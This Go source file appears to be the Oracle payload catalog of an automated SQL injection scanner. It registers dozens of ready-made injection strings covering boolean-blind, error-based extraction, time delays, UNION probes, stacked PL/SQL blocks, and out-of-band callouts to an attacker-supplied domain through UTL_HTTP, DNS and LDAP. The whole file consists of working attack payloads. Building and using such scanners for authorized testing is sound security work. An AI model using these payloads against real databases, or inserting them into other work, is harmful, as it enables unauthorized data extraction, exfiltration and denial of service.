package payloads

// Oracle payload catalog. Every Oracle payload respects the FROM dual
// requirement that makes expressions evaluable at the statement level.

func orRow(id, title, tech, clause, minv, maxv string, risk, level, conf int, pre, suf, tpl string) Payload {
	return Payload{
		ID: id, Title: title, DBMS: DBOracle, Technique: Technique(tech),
		Clause: Clause(clause), MinVersion: minv, MaxVersion: maxv,
		Risk: risk, Level: level, Confidence: conf,
		PrefixMode: pre, SuffixMode: suf, Template: tpl,
	}
}

func init() {
	rows := []Payload{
		// ---- Boolean ----
		orRow("oracle-bool-and-num", "Oracle AND boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig} AND 1=1"),
		orRow("oracle-bool-and-string", "Oracle AND boolean-based blind - WHERE clause (string)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig}' AND '1'='1"),
		orRow("oracle-bool-and-alpha", "Oracle AND boolean-based blind - WHERE clause (alphabetic)", "boolean", "where", "", "", 1, 1, 88, "and", "comment", "{orig}' AND 'a'='a"),
		orRow("oracle-bool-or-num", "Oracle OR boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 2, 88, "or", "comment", "{orig} OR 1=1"),
		orRow("oracle-bool-and-dual", "Oracle AND boolean-based blind - WHERE clause (FROM dual)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig} AND (SELECT 1 FROM dual)=1"),
		orRow("oracle-bool-and-paren", "Oracle AND boolean-based blind - WHERE clause (paren)", "boolean", "where", "", "", 1, 2, 86, "and", "comment", "{orig} AND (1=1)"),
		orRow("oracle-bool-having", "Oracle AND boolean-based blind - HAVING clause", "boolean", "having", "", "", 1, 3, 84, "and", "comment", "{orig} HAVING 1=1"),
		orRow("oracle-bool-gb", "Oracle AND boolean-based blind - GROUP BY clause", "boolean", "groupby", "", "", 1, 3, 82, "and", "comment", "{orig} GROUP BY 1 HAVING 1=1"),
		orRow("oracle-bool-ob", "Oracle AND boolean-based blind - ORDER BY clause", "boolean", "orderby", "", "", 1, 2, 84, "and", "comment", "{orig} ORDER BY CASE WHEN 1=1 THEN 1 ELSE 2 END"),

		// ---- Error-based ----
		orRow("oracle-err-div-zero", "Oracle AND error-based - WHERE clause (division by zero)", "error", "where", "", "", 1, 1, 86, "and", "comment", "{orig} AND (SELECT 1/(0) FROM dual)"),
		orRow("oracle-err-utl-inaddr", "Oracle AND error-based - WHERE clause (UTL_INADDR)", "error", "where", "", "", 1, 2, 90, "and", "comment", "{orig} AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT ({query}) FROM dual)) FROM dual) IS NOT NULL"),
		orRow("oracle-err-ctxsys", "Oracle AND error-based - WHERE clause (CTXSYS.DRITHSX)", "error", "where", "", "", 1, 2, 90, "and", "comment", "{orig} AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT ({query}) FROM dual)) FROM dual) IS NOT NULL"),
		orRow("oracle-err-xmltype", "Oracle AND error-based - WHERE clause (XMLType)", "error", "where", "", "", 1, 3, 90, "and", "comment", "{orig} AND (SELECT XMLType((SELECT ({query}) FROM dual)) FROM dual) IS NOT NULL"),
		orRow("oracle-err-to-number", "Oracle AND error-based - WHERE clause (TO_NUMBER)", "error", "where", "", "", 1, 3, 88, "and", "comment", "{orig} AND (SELECT TO_NUMBER((SELECT ({query}) FROM dual)) FROM dual) IS NOT NULL"),
		orRow("oracle-err-cast", "Oracle AND error-based - WHERE clause (CAST)", "error", "where", "", "", 1, 3, 86, "and", "comment", "{orig} AND (SELECT CAST((SELECT ({query}) FROM dual) AS NUMBER(1)) FROM dual) IS NOT NULL"),
		orRow("oracle-err-invalid-num", "Oracle AND error-based - WHERE clause (invalid number)", "error", "where", "", "", 1, 2, 86, "and", "comment", "{orig} AND (SELECT CASE WHEN (1=1) THEN TO_NUMBER((SELECT ({query}) FROM dual)) ELSE 0 END FROM dual) IS NOT NULL"),
		orRow("oracle-err-oby", "Oracle AND error-based - ORDER BY clause (invalid number)", "error", "orderby", "", "", 1, 3, 84, "and", "comment", "{orig} ORDER BY (SELECT TO_NUMBER((SELECT ({query}) FROM dual)) FROM dual)"),

		// ---- Time-based ----
		orRow("oracle-time-dbms-pipe", "Oracle AND time-based blind - WHERE clause (DBMS_PIPE.RECEIVE_MESSAGE)", "time", "where", "", "", 1, 1, 90, "and", "comment", "{orig} AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) FROM dual) IS NOT NULL"),
		orRow("oracle-time-dbms-pipe-str", "Oracle AND time-based blind - WHERE clause (DBMS_PIPE string)", "time", "where", "", "", 1, 2, 90, "and", "comment", "{orig}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) FROM dual) IS NOT NULL"),
		orRow("oracle-time-dbms-lock", "Oracle AND time-based blind - WHERE clause (DBMS_LOCK.SLEEP)", "time", "where", "", "", 2, 2, 88, "and", "comment", "{orig} AND DBMS_LOCK.SLEEP({seconds}) IS NULL"),
		orRow("oracle-time-dense-rank", "Oracle AND time-based blind - WHERE clause (DENSE_RANK heavy)", "time", "where", "", "", 3, 4, 82, "and", "comment", "{orig} AND 1=(SELECT COUNT(*) FROM all_users a,all_users b,all_users c,all_users d)"),
		orRow("oracle-time-case-pipe", "Oracle AND time-based blind - WHERE clause (CASE + DBMS_PIPE)", "time", "where", "", "", 2, 3, 86, "and", "comment", "{orig} AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) ELSE 0 END FROM dual) IS NOT NULL"),
		orRow("oracle-time-ob-pipe", "Oracle AND time-based blind - ORDER BY clause (DBMS_PIPE)", "time", "orderby", "", "", 2, 4, 84, "and", "comment", "{orig} ORDER BY (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) ELSE 0 END FROM dual)"),

		// ---- UNION ----
		orRow("oracle-union-orderby", "Oracle UNION query - ORDER BY column probe", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} ORDER BY {marker}"),
		orRow("oracle-union-select-null", "Oracle UNION query - UNION SELECT NULL FROM dual", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION SELECT {colcount} FROM dual"),
		orRow("oracle-union-all-null", "Oracle UNION query - UNION ALL SELECT NULL FROM dual", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION ALL SELECT {colcount} FROM dual"),
		orRow("oracle-union-select-marker", "Oracle UNION query - UNION SELECT marker FROM dual", "union", "where", "", "", 1, 2, 92, "replace", "comment", "{orig} UNION SELECT {marker},{colcount} FROM dual"),
		orRow("oracle-union-gb", "Oracle UNION query - GROUP BY clause", "union", "groupby", "", "", 1, 3, 86, "replace", "comment", "{orig} GROUP BY {marker}) UNION SELECT {colcount} FROM dual"),

		// ---- Stacked ----
		orRow("oracle-stack-anon", "Oracle stacked queries - anonymous PL/SQL block (risk)", "stacked", "generic", "", "", 3, 4, 84, "term", "comment", "{orig}';BEGIN DBMS_LOCK.SLEEP({seconds});END;-- -"),
		orRow("oracle-stack-pipe", "Oracle stacked queries - anonymous DBMS_PIPE block (risk)", "stacked", "generic", "", "", 3, 4, 84, "term", "comment", "{orig}';BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds});END;-- -"),
		orRow("oracle-stack-select", "Oracle stacked queries - compound SELECT (risk)", "stacked", "generic", "", "", 3, 5, 82, "term", "comment", "{orig}';SELECT 1 FROM dual;-- -"),
		orRow("oracle-stack-raise", "Oracle stacked queries - PL/SQL RAISE_APPLICATION_ERROR extract (risk)", "stacked", "generic", "", "", 3, 5, 80, "term", "comment", "{orig}';BEGIN RAISE_APPLICATION_ERROR(-20001,(SELECT ({query}) FROM dual));END;-- -"),

		// ---- Inline ----
		orRow("oracle-inline-sub", "Oracle inline query - subquery as value FROM dual", "inline", "where", "", "", 1, 1, 86, "value", "none", "(SELECT 1 FROM dual)"),
		orRow("oracle-inline-nested", "Oracle inline query - nested subquery comparison", "inline", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (SELECT 8634 FROM dual)=8634"),
		orRow("oracle-inline-case", "Oracle inline query - CASE subquery FROM dual", "inline", "where", "", "", 1, 3, 84, "and", "comment", "{orig} AND (SELECT CASE WHEN (SELECT 1 FROM dual)=1 THEN 1 ELSE 0 END FROM dual)=1"),

		// ---- OOB ----
		orRow("oracle-oob-utl-inaddr", "Oracle out-of-band - UTL_INADDR DNS (risk)", "oob", "where", "", "", 2, 4, 80, "and", "comment", "{orig} AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{domain}') FROM dual) IS NOT NULL"),
		orRow("oracle-oob-utl-http", "Oracle out-of-band - UTL_HTTP callout (risk)", "oob", "generic", "", "", 3, 5, 78, "term", "comment", "{orig}';SELECT UTL_HTTP.REQUEST('http://{domain}/vx') FROM dual;-- -"),
		orRow("oracle-oob-dbms-ldap", "Oracle out-of-band - DBMS_LDAP init (risk)", "oob", "generic", "", "", 3, 5, 76, "term", "comment", "{orig}';BEGIN DBMS_LDAP.INIT('{domain}',389);END;-- -"),
	}
	for _, p := range rows {
		MustRegister(p)
	}
}
